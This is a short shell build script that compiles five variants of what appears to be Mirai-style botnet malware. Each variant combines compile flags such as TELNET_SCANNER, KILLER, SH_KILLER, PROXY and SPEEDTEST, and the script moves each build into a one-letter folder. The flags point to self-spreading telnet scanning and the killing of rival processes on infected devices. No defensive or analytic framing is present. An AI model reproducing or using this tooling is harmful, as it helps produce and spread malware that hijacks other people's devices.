# TELNET + KILLER + SH KILLER
./build.release.sh "" "-DPROXY -DSPEEDTEST -DTELNET_SCANNER -DSH_KILLER -DKILLER"
mv release t

# TELNET
./build.release.sh "" "-DPROXY -DSPEEDTEST -DTELNET_SCANNER"
mv release n

# TELNET + KILLER
./build.release.sh "" "-DPROXY -DSPEEDTEST -DTELNET_SCANNER -DKILLER"
mv release a

# KILLER ONLY
./build.release.sh "" "-DPROXY -DSPEEDTEST -DKILLER"
mv release z

# CLEAN NOTHING
./build.release.sh "" "-DPROXY -DSPEEDTEST"
mv release v
